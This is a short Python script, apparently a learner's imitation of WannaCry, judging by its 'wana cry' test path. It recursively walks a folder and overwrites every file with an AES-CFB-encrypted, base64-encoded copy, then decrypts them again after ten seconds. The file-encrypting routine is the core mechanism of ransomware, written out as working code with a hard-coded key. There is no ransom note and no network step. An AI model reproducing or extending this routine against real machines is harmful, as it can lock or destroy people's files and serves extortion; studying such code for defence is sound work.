from Crypto.Cipher import AES
from binascii import b2a_hex,a2b_hex
from Crypto import Random
import base64
import os
import time


class AesEncryption(object):
    def __init__(self, key, mode=AES.MODE_CFB):
        self.key = self.check_key(key)
        # 密钥key长度必须为16,24或者32bytes的长度
        self.mode = mode
        #self.iv = b'7#7FqXu\x06\x847-\xba\xe5\x07\xeb\xa7'
        self.iv = Random.new().read(AES.block_size)
        print(self.iv)

    def check_key(self, key):
        '检测key的长度是否为16,24或者32bytes的长度'
        try:
            if isinstance(key, bytes):
                assert len(key) in [16, 24, 32]
                return key
            elif isinstance(key, str):
                assert len(key.encode()) in [16, 24, 32]
                return key.encode()
            else:
                raise Exception(f'密钥必须为str或bytes,不能为{type(key)}')
        except AssertionError:
            print('输入的长度不正确')

    def check_data(self,data):
        '检测加密的数据类型'
        if isinstance(data, str):
            data = data.encode()
        elif isinstance(data, bytes):
            pass
        else:
            raise Exception(f'加密的数据必须为str或bytes,不能为{type(data)}')
        return data
    def encrypt(self, data):
        ' 加密函数 '
        data = self.check_data(data)
        cryptor = AES.new(self.key, self.mode,self.iv)
        return b2a_hex(cryptor.encrypt(data)).decode()

    def decrypt(self,data):
        ' 解密函数 '
        data = self.check_data(data)
        cryptor = AES.new(self.key, self.mode,self.iv)
        return cryptor.decrypt(a2b_hex(data)).decode()



def get_file_path(path):
    filelist = []    
    for root, dirs, files in os.walk(path):
        for name in files:
            filelist.append(os.path.join(root, name))
    return filelist


def en_file(filelist):
    for name in filelist:
            with open(name,"rb") as f:
                base64_data = base64.b64encode(f.read())
                data = base64_data
            with open(name,"w") as f:
                e = aes.encrypt(data)
                f.write(e)
                f.close()


def de_file(filelist):    
    for name in filelist:
            with open(name,"rb") as f:
                d = aes.decrypt(f.read())                
                base64_data = base64.b64decode(d)
                data = base64_data
            with open(name,"wb") as f:
                f.write(data)
                f.close()

            
if __name__ == '__main__':
    key = '1234567890123456'     #密钥
    path = r"F:\ASUS\Desktop\coding\wana cry\test"
    aes = AesEncryption(key)
    filelist = get_file_path(path)
    en_file(filelist)
    print('encrypt finish')
    time.sleep(10)
    de_file(filelist)
    print('decrypt finish')
